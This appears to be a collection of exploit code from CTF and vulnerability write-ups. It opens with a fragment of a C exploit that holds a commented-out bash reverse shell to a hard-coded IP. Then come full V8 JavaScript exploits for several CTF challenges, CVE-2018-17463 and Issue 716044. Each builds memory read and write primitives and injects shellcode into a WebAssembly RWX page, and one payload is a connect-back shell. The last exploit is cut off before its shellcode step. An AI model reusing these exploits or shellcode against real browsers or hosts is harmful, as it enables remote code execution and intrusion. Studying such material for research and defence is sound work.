    //char cmd[0x40] = "/bin/bash -c \'bash -i >& /dev/tcp/192.168.184.142/8888 0>&1\'";
    faker_time_struct[0] = 0xffffffffffffffff;
    faker_time_struct[1] = time_struct - 0x110f360;
    faker_time_struct[2] = system_plt;
    faker_time_struct[3] = cmd_addr;
    faker_time_struct[4] = 0;
    faker_time_struct[5] = 0x100000000;

    memcpy(buf + 0x108, faker_time_struct, 0x40);
    memcpy(buf + 0x108 + 0x40, cmd, 0x40);
    *((uint8_t*)(buf + 7 + 0x300)) = 1;
    *((uint64_t*)(buf + 7 + 0x310)) = faker_time_struct_addr ^ time_struct;
    set_encode2(0x318);
    exec_bh();
    sleep(0.3);
    set_exec_time(0x18, 0);
    exec_bh();

    //0x1d40  0x101a80
}
```





### v8

##### *ctf oob

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];

var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);
    let obj_addr = f2i(obj_array[0]) - 1n;
    obj_array.oob(obj_array_map);
    return obj_addr;
}

function fakeObject(addr_to_fake)
{
    float_array[0] = i2f(addr_to_fake + 1n);
    float_array.oob(obj_array_map);
    let faked_obj = float_array[0];
    float_array.oob(float_array_map);
    return faked_obj;
}

var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x1000000000n),
    1.1,
    2.2,
];

var fake_array_addr = addressOf(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
    return leak_data;
}

function write64(addr, data)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));    
}

// function write64_dataview(addr, data)
// {
//     write64(buf_backing_store_addr, addr);
//     %DebugPrint(data_buf);
//     %SystemBreak();
//     data_view.setFloat64(0, i2f(data), true);
//     console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
// }


var leak_d8_addr = 0n;
var start_addr = fake_array_addr - 0xef40n;

while(1){
    let leak_addr = read64(start_addr);
    let low_bit = leak_addr & 0xfffn;
    if(low_bit == 0xfc0n){
        leak_d8_addr = leak_addr - 0x29dfc0n;
        console.log("[*] Success find leak_d8_addr: 0x" + hex(leak_d8_addr));
        break;
    }
    start_addr -= 8n;
}

var libc_start_main_got = leak_d8_addr + 0xd99740n;
var libc_base_addr = read64(libc_start_main_got) - 0x23f90n;
console.log("[*] Success leak libc_base_addr: 0x" + hex(libc_base_addr));
var system_addr = libc_base_addr + 0x52290n;
var free_hook = libc_base_addr + 0x1eee48n;

var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
write64(buf_backing_store_addr, free_hook);
data_view.setFloat64(0, i2f(system_addr), true);
console.log("/bin/sh");
```



```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];

var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);
    let obj_addr = f2i(obj_array[0]) - 1n;
    obj_array.oob(obj_array_map);
    return obj_addr;
}

function fakeObject(addr_to_fake)
{
    float_array[0] = i2f(addr_to_fake + 1n);
    float_array.oob(obj_array_map);
    let faked_obj = float_array[0];
    float_array.oob(float_array_map);
    return faked_obj;
}

var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x1000000000n),
    1.1,
    2.2,
];

var fake_array_addr = addressOf(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
    return leak_data;
}

function write64(addr, data)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));    
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addressOf(f);
var shared_info_addr = read64(f_addr + 0x18n) - 1n;
var wasm_data_addr = read64(shared_info_addr + 8n) - 1n;
var instance_addr = read64(wasm_data_addr + 0x10n) - 1n;
var rwx_page_addr = read64(instance_addr + 0x88n);
// console.log("0x" + hex(f_addr));
// console.log("0x" + hex(shared_info_addr));
// console.log("0x" + hex(wasm_data_addr));
console.log("[*] leak rwx_page_addr is 0x" + hex(rwx_page_addr));

var shellcode = [
    0x6e69622fb848686an,
    0xe7894850732f2f2fn,
    0x2434810101697268n,
    0x6a56f63101010101n,
    0x894856e601485e08n,
    0x50f583b6ad231e6n
];

var data_buf = new ArrayBuffer(48);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);
data_view.setFloat64(0, i2f(shellcode[0]), true);
data_view.setFloat64(8, i2f(shellcode[1]), true);
data_view.setFloat64(16, i2f(shellcode[2]), true);
data_view.setFloat64(24, i2f(shellcode[3]), true);
data_view.setFloat64(32, i2f(shellcode[4]), true);
data_view.setFloat64(40, i2f(shellcode[5]), true);

f();
// %DebugPrint(data_buf);
// %SystemBreak();
```



##### CVE-2018-17463

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f_to_i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i_to_f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var x, y;

let OBJ_LEN  = 0x30;
let OPTIMIZATION_NUM = 10000;

function get_obj(){
    let res = {a:0x1234};
    for (let i = 0; i< OBJ_LEN;i++){
        eval(`res.${'b'+i} = -${0x4869 + i};
        `);        
    }
    return res;
}

function find_collision(){
    let find_obj = [];
    for (let i = 0;i<OBJ_LEN;i++){
        find_obj[i] = 'b'+i;
    }
    eval(`
        function bad_create(x){
            x.a;
            this.Object.create(x);
            ${find_obj.map((b) => `let ${b} = x.${b};`).join('')}
            return [${find_obj}];
        }
    `);
    for (let i = 0; i<OPTIMIZATION_NUM;i++){
        let tmp = bad_create(get_obj());
        for (let j = 0 ;j<tmp.length;j++){
            if(tmp[j] != -(j+0x4869) && tmp[j] < -0x4868 && tmp[j] > -(1+OBJ_LEN +0x4869) ){
                console.log(i);
                console.log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
                return ['b'+j , 'b' + -(tmp[j]+0x4869)];
            }
        }
    }
}

function getOBJ4addr(obj){
    let res = {a:0x1234};
    for (let i = 0; i< OBJ_LEN;i++){
        if (('b'+i)!= x &&('b'+i)!= y  ){
        eval(`res.${'b'+i} = 1.1;
        `);        }
        if (('b'+i)== x){
            eval(`
                res.${x} = {x1:1.1,x2:1.2};
                `);            
        }
        if (('b'+i)== y){
            eval(`
                res.${y} = {y1:obj};
                `);            
        }        
    }
    return res;
}
function addrof(obj){
    eval(`
        function bad_create(o){
            o.a;
            this.Object.create(o);
            return o.${x}.x1;
        }
    `);

    for (let i = 0;i < OPTIMIZATION_NUM;i++){ 
        let ret = bad_create( getOBJ4addr(obj));
        if (ret!= 1.1){
            return ret; 
        }
    }

}

function getOBJ4read(obj){
    let res = {a:0x1234};
    for (let i = 0; i< OBJ_LEN;i++){
        if (('b'+i)!= x &&('b'+i)!= y  ){
        eval(`res.${'b'+i} = {};
        `);        }
        if (('b'+i)== x){
            eval(`
                res.${x} = {x0:{x1:1.1,x2:1.2}};
                `);            
        }
        if (('b'+i)== y){
            eval(`
                res.${y} = {y1:obj};
                `);            
        }        
    }
    return res;
}
function arbitraryWrite(obj,addr){
    eval(`
        function bad_create(o,value){
            o.a;
            this.Object.create(o);
            let ret = o.${x}.x0.x2;
            o.${x}.x0.x2 = value;
            return ret;
        }
    `);

    for (let i = 0;i < OPTIMIZATION_NUM;i++){ 
        let ret = bad_create( getOBJ4read(obj),addr);
        if (ret!= 1.2){
            return ;
        }
    }
}


[x,y] = find_collision(); 

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addrof(f);
console.log("[*] leak_f_addr_is 0x" + hex(f_to_i(f_addr) - 1n));
var data_buf= new ArrayBuffer(1024);
arbitraryWrite(data_buf, f_addr);
var data_view = new DataView(data_buf);
var shared_info_addr = data_view.getFloat64(0x17,true);
console.log("[*] leak_shared_info_addr_is 0x" + hex(f_to_i(shared_info_addr) - 1n));

arbitraryWrite(data_buf, shared_info_addr);
var wasm_data_addr = data_view.getFloat64(7,true);
console.log("[*] leak_wasm_data_addr_is 0x" + hex(f_to_i(wasm_data_addr) - 1n));

arbitraryWrite(data_buf, wasm_data_addr);
var instance_addr = data_view.getFloat64(0xf, true);
console.log("[*] leak_instance_addr_is 0x" + hex(f_to_i(instance_addr) - 1n));

arbitraryWrite(data_buf, instance_addr);
var rwx_page_addr = data_view.getFloat64(0xef, true);
console.log("[*] leak_rwx_page_addr_is 0x" + hex(f_to_i(rwx_page_addr)));

arbitraryWrite(data_buf, rwx_page_addr);
var shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
var write_tmp = new Uint8Array(data_buf);
write_tmp.set(shellcode_calc);
f();
```



#####  xnuca2020-babyV8

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f_to_i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i_to_f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function p64_h(i){
    return i >> 32n;
}

function p64_l(i){
    return i & 0xffffffffn;
}

function p64(x, y){
    return i_to_f((x << 32n) + y);
}

var obj = {"a": 1.1};
var arr = [];
arr[0] = 1.1;
arr.push(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
var oob_arr = new Array(1.1, 2.2);
var obj_array = [obj];

var leak = f_to_i(arr[17]);
var float_array_map = p64_l(leak);
leak = f_to_i(arr[18]);
arr[18] = p64(0x10000n, p64_l(leak));

leak = f_to_i(oob_arr[3]);
var obj_array_map = p64_h(leak);
// var s = p64_l(leak);

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    leak = f_to_i(oob_arr[3]);
    let obj_addr = p64_l(leak);
    return obj_addr;
}

function fakeObject(addr_to_fake)
{
    oob_arr[3] = p64(obj_array_map, addr_to_fake);
    let faked_obj = obj_array[0];
    return faked_obj;
}

var fake_array = [
    p64(0n, float_array_map),
    p64(0x2n, 0x41414141n),
    1.1,
    2.2,
];

var fake_object_addr = addressOf(fake_array) - 0x20n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
    fake_array[1] = p64(0x2n, addr - 8n);
    let leak_data = f_to_i(fake_object[0]);
    //console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
    return leak_data;
}

function write64(addr, data)
{
    fake_array[1] = p64(0x2n, addr - 8n);
    fake_object[0] = i_to_f(data);
    //console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));    
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addressOf(f);
var shared_info_addr = p64_h(read64(f_addr + 0x8n));
var wasm_data_addr = p64_h(read64(shared_info_addr));
var instance_addr = p64_l(read64(wasm_data_addr + 0x8n));
var rwx_page_addr = read64(instance_addr + 0x68n);
console.log("leak_rwx_page_addr_is 0x" + hex(rwx_page_addr));

var data_buf= new ArrayBuffer(0x100);
var data_buf_addr = addressOf(data_buf);
write64(data_buf_addr + 0x14n, rwx_page_addr);
var shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72,
                      187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255,
                      255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252,
                      21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25,
                      191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233,
                      161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218,
                      201, 186, 175, 93];

var write_tmp = new Uint8Array(data_buf);
write_tmp.set(shellcode_calc);
f();
```



##### 34c3 v9

```js
var buf = new ArrayBuffer(16);
var dataView = new DataView(buf);

function f2i(f) {
  dataView.setFloat64(0, f, true);
  let intValue = (dataView.getUint32(0, true) >>> 0) +
                   (dataView.getUint32(4, true) >>> 0) * 0x100000000;
  return intValue;
}

function i2f(i) {
  //let intValue = Number(i);
  dataView.setUint32(0, i % 0x100000000, true);
  dataView.setUint32(4, i / 0x100000000, true);
  return dataView.getFloat64(0, true);
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function gc(){
    for(var i=0;i<1024 * 1024 *16;i++){
        new String;
    }
}

var obj = {"a": 1};
var obj_array = [1.1];
var float_array = [1.1];
var float_array1 = [1.1];

function opt1(o){
    var a = float_array[0];
    o();
    return float_array[0];
}

function addressOf1(obj_to_leak){

    for(let i = 0; i < 0x8000; ++i){
        opt1(function() {});
    }

    let addr = opt1(function() { float_array[0] = obj_to_leak });
    return addr
}

function opt2(o){
    var b = float_array1[0];
    o();
    return float_array1[0];
}

function addressOf2(obj_to_leak){

    for(let i = 0; i < 0x8000; ++i){
        opt2(function() {});
    }

    let addr = opt2(function() { float_array1[0] = obj_to_leak });
    return addr
}

function opt3(o, val){
    var c = obj_array[0];
    o();
    obj_array[0] = val;
}

function fakeObject(addr_to_fake)
{
    for(let i = 0; i < 0x8000; ++i){
        opt3(function() {}, 1.1);
    }
    let faked_obj = opt3(function() { obj_array[0] = obj }, addr_to_fake);
    return faked_obj;
}

gc();
var fake_array = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12];
gc();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var fake_array_addr = f2i(addressOf1(fake_array));
console.log("leak_fake_array_addr_is 0x" + hex(fake_array_addr - 1));

var f_addr = f2i(addressOf2(f));
console.log("leak_f_addr_is 0x" + hex(f_addr -1));


var fake_map_addr = fake_array_addr + 0x98 + 0x10
var fake_ArrayBuffer_addr = fake_array_addr + + 0x98 + 0x30;

fake_array[1] = i2f(0x1900c60f00000a);
fake_array[2] = i2f(0x82003ff);
fake_array[4] = i2f(fake_map_addr);
fake_array[7] = i2f(0x20000000000);
fake_array[8] = i2f(f_addr + 0x38 - 1);
fake_array[9] = i2f(f_addr + 0x38 - 1);
fake_array[10] = i2f(0x200);
fake_array[11] = i2f(4);

fakeObject(i2f(fake_ArrayBuffer_addr));
var fake_ArrayBuffer = obj_array[0];
var data_view = new DataView(fake_ArrayBuffer);
var rwx_page_addr = f2i(data_view.getFloat64(0, true));
console.log("leak_rwx_page_addr_is 0x" + hex(rwx_page_addr));

fake_array[8] = i2f(rwx_page_addr + 0x5f);
fake_array[9] = i2f(rwx_page_addr + 0x5f);


var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

for(var i = 0; i < shellcode.length;i++){
	var value = shellcode[i];		
	data_view.setUint32(i * 4,value,true);
}


// %DebugPrint(fake_array);
// %DebugPrint(f);
// %DebugPrint(fake_ArrayBuffer);
// %SystemBreak();

f();
```





##### 数字经济final-browser

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function gc(){
    for(var i = 0; i < 1024 * 1024 *16; i++){
        new String;
    }
}

var obj = {};
var val = {
    valueOf:function() {
       vuln_array.length = 0x100;
       return 0xffffffff;
    }
};
var vuln_array = new Array(30);
var float_array = [1.1, 1.2];
var obj_array = [obj];
var data_buf= new ArrayBuffer(0x100);
var data_view = new DataView(data_buf);
vuln_array.coin(0, val);

var float_array_map = float_array[2];
var obj_array_map = float_array[9];

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    float_array[9] = float_array_map;
    let obj_addr = f2i(obj_array[0]);
    float_array[9] = obj_array_map;
    return obj_addr;
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addressOf(f) - 1n;
console.log("[*] leak_f_addr_is 0x" + hex(f_addr));

float_array[17] = i2f(f_addr + 0x18n);
var shared_info_addr = f2i(data_view.getFloat64(0, true)) -1n;
console.log("[*] leak_shared_info_addr_is 0x" + hex(shared_info_addr));

float_array[17] = i2f(shared_info_addr + 8n)
var wasm_data_addr = f2i(data_view.getFloat64(0, true)) - 1n;
console.log("[*] leak_wasm_data_addr_is 0x" + hex(wasm_data_addr));

float_array[17] = i2f(wasm_data_addr + 0x10n)
var instance_addr = f2i(data_view.getFloat64(0, true)) - 1n;
console.log("[*] leak_instance_addr_is 0x" + hex(instance_addr));

float_array[17] = i2f(instance_addr + 0x88n);
var rwx_page_addr = f2i(data_view.getFloat64(0, true));
console.log("[*] leak_rwx_page_addr_is 0x" + hex(rwx_page_addr));

float_array[17] = i2f(rwx_page_addr);
//var shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
var shellcode = [0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,
    0xb9,0x02,0x00,0x22,0xb8,0x52,0x9d,0xfc,0x31,0x51,0x48,0x89,0xe6,0x6a,0x10,
    0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,
    0x0f,0x05,0x75,0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,
    0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05]
var write_tmp = new Uint8Array(data_buf);
write_tmp.set(shellcode);
f();
```





##### qwb_growupjs

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function gc(){
    for(var i = 0;i < 1024 * 1024 * 16;i++){
        new String;
    }
}

var float_array;
function opt(){
    float_array = [1.1];
    let idx = 1;
    idx = idx & 0xfff;
    return float_array[idx];
}

for (let i = 0; i < 0x10000; i++){
    opt();
}

// var float_array_map = f2i(opt());
// var obj_array_map = float_array_map + 0xa0n;

// console.log(hex(float_array_map))
// console.log(hex(obj_array_map))
// var sss = i2f(float_array_map);
// var ttt = i2f(obj_array_map);

var float_array_map = opt();
var obj_array_map = i2f(f2i(float_array_map) + 0xa0n);


//console.log(hex(f2i(float_array_map)));
//console.log(hex(f2i(obj_array_map)));

var float_array1;
function fakeObject_opt(addr_to_fake){
    float_array1 = [addr_to_fake];
    let idx = 1;
    idx = idx & 0xfff;
    float_array1[idx] = obj_array_map;   //不能调用函数
    return float_array1
}

for (let i = 0; i < 0x10000; i++){
    fakeObject_opt(1.1);
}

function fakeObject(addr_to_fake)
{
    
    let faked_obj = fakeObject_opt(addr_to_fake)[0];
    return faked_obj;
}

//fakeObject(float_array_map);
var float_array_map_obj = fakeObject(float_array_map);
//var float_array_map_obj = float_array1[0];

var obj = {"a": 1};
var obj_array;
function addressOf_opt(obj_to_leak){
    obj_array = [obj_to_leak];
    //let idx = {a:1};
    let idx = 1
    idx = idx & 0xfff;
    obj_array[idx] = float_array_map_obj;
    return obj_array;
}

for (let i = 0; i < 0x10000; i++){
    addressOf_opt(obj);
}

function addressOf(obj_to_leak)
{
    let obj_addr = addressOf_opt(obj_to_leak)[0];
    return obj_addr;
}

var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x1000000000n),
    1.1,
    2.2,
];

var data_buf= new ArrayBuffer(0x100);
var data_view = new DataView(data_buf);

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;


var fake_array_addr = f2i(addressOf(fake_array));
var fake_obj_addr = i2f(fake_array_addr - 0x30n);
console.log("[*] leak_fake_array_addr_is 0x" + hex(fake_array_addr));
var fake_obj = fakeObject(fake_obj_addr);
fake_array[2] = i2f(fake_array_addr + 0x58n);

var wasmInstance_addr = f2i(addressOf(wasmInstance));
console.log("[*] wasmInstance_addr_is 0x" + hex(wasmInstance_addr));

fake_obj[1] = i2f(wasmInstance_addr + 0x87n);
var rwx_page_addr = data_view.getFloat64(0, true);
console.log("[*] leak_rwx_page_addr_is 0x" + hex(f2i(rwx_page_addr)));

fake_obj[1] = rwx_page_addr;
var shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 
    255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 
    255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 
    21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 
    181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 
    206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
var write_tmp = new Uint8Array(data_buf);
write_tmp.set(shellcode_calc);
f();

//%DebugPrint(fake_obj);
// %DebugPrint(data_buf);
//%SystemBreak();
```



##### Issue 716044

```js
var buf = new ArrayBuffer(16);
var dataView = new DataView(buf);

function f2i(f) {
  dataView.setFloat64(0, f, true);
  let intValue = (dataView.getUint32(0, true) >>> 0) +
                   (dataView.getUint32(4, true) >>> 0) * 0x100000000;
  return intValue;
}

function i2f(i) {
  //let intValue = Number(i);
  dataView.setUint32(0, i % 0x100000000, true);
  dataView.setUint32(4, i / 0x100000000, true);
  return dataView.getFloat64(0, true);
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function gc(){
    for(var i=0;i<1024 * 1024 *16;i++){
        new String;
    }
}
var obj = {"a":1};
var obj_array;
var vuln_array;
var float_array;
var data_buf;
class Array1 extends Array {
  constructor(len) {
      super(1);
      vuln_array = [1.1];
      obj_array = [obj];
      data_buf = new ArrayBuffer(0x100);
    }
};

class MyArray extends Array {
  static get [Symbol.species]() {
      return Array1;
  }
}

//overlen = i2f(0x1234);
a = new MyArray();
a[7] = 1.1;
var b = a.map(x => 0x1234); //只能写入整数


var obj_array_map = vuln_array[4];
var float_array_map = i2f(f2i(obj_array_map) + 0x210);
console.log("[*] leak_float_array_map_is" + hex(f2i(float_array_map)));
console.log("[*] leak_obj_array_map_is" + hex(f2i(obj_array_map)));

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    vuln_array[4] = float_array_map;
    let obj_addr = obj_array[0];
    vuln_array[4] = obj_array_map;
    return obj_addr;
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
  127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
  1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
  0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var leak_f_addr = addressOf(f);
console.log("[*] leak_f_addr_is 0x" + hex(f2i(leak_f_addr)));
vuln_array[17] = leak_f_addr;

var data_view = new DataView(data_buf);
var rwx_page_addr = data_view.getFloat64(0x37,true);
console.log("[*] leak_rwx_page_addr_is 0x" + hex(f2i(rwx_page_addr)));
vuln_array[17] = rwx_page_addr;

